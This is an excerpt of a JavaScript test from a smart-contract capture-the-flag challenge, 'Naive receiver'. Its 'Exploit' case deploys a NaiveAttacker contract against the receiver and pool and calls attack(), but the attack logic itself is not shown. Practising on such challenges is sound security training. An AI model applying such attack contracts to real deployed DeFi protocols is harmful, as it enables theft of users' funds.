...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Exploit", async function () {
    ...
    // Opción 1.3
    const NaiveAttackerFactory = await ethers.getContractFactory("NaiveAttacker", deployer);
    this.naiveAttacker = await NaiveAttackerFactory.deploy(this.receiver.address,this.pool.address);
    await this.naiveAttacker.attack();
  });
